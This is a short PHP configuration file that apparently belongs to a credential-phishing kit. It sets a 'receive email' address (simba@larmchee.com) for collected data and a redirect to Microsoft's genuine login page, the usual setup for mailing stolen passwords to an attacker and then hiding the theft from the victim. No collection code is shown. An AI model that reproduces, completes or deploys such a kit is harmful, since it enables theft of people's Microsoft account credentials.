<?php 
$Receive_email="simba@larmchee.com";
$redirect="https://login.microsoftonline.com/common/login/";
?>